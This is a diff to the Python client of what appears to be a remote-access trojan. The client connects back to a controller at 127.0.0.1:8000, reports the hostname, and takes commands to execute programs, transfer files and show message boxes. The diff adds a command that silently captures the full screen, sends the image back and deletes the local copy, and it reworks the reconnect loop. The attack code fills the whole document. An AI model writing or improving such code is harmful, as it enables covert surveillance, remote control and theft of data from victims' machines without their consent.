@@ -22,7 +22,10 @@ import getpass
 import platform
 import time
 import re
-from pyscreenshot import grab_to_file
+
+from mss.windows import MSS as mss
+
+sct = mss()
 
 HOST = '127.0.0.1'
 PORT = int('8000')
@@ -60,8 +63,10 @@ def download(command):
     main()
 
 def upload(command):
-    fileName = command.replace("download ", "")
-    if fileName == "ss.png": file = grab_to_file("ss.png")
+    if "screenshot() download " in command:
+        fileName = command.replace("screenshot() download ", "")
+    else:
+        fileName = command.replace("download ", "")
     try:
         f = open(fileName, 'rb')
         l = f.read(1024)
@@ -71,13 +76,20 @@ def upload(command):
             l = f.read(1024)
         f.close()
         s.send(END_OF_FILE)
-        os.remove("ss.png")
-        os.remove(sys.argv[0]+"c")
+        if "screenshot() download " in command:
+            os.remove(fileName)
         main()
 
     except IOError:
         s.sendall("File not found\n")
         main()
+
+def screenshot(command):
+    fileName = command.replace("screenshot() ", "")
+    for file in sct.save(mon=-1, output="%s"%(fileName.replace("download ", ""))):
+        pass
+    upload(command)
+
 
 def messageBox(message):
     root = Tk()
@@ -129,8 +141,11 @@ def main():
         elif "upload" in command:
             download(command)
 
-        elif "download" in command:
+        elif "download" in command and "screenshot()" not in command:
             upload(command)
+
+        elif "screenshot()" in command:
+            screenshot(command)
 
         elif "execute" in command:
             command = command.replace("execute ", "")
@@ -157,9 +172,9 @@ def start():
     while True:
         try:
             connect()
-	    send(socket.gethostname())
+            send(socket.gethostname())
             main()
-	except:
+        except:
             start()
 
 if __name__ == "__main__":
